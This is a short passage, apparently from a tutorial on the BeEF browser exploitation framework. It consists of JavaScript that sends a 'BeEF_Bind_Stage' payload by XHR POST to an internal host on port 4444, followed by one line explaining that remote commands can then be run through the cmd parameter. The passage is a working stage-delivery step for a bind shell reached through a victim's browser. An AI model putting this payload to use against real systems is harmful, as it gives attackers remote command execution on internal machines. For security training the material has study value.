```javascript
var uri = "http://172.16.37.151:4444/"; 
xhr = new XMLHttpRequest(); 
xhr.open("POST", uri, true);
xhr.setRequestHeader("Content-Type", "text/plain");
xhr.setRequestHeader('Accept','*/*');
xhr.setRequestHeader("Accept-Language", "en");
xhr.sendAsBinary("cmd=" + BeEF_Bind_Stage);
```

Now that both the BeEF Bind Stager and the Stage are running in memory, you’re now ready to interact with it, issuing POST requests containing the command you want to execute in the cmd parameter.
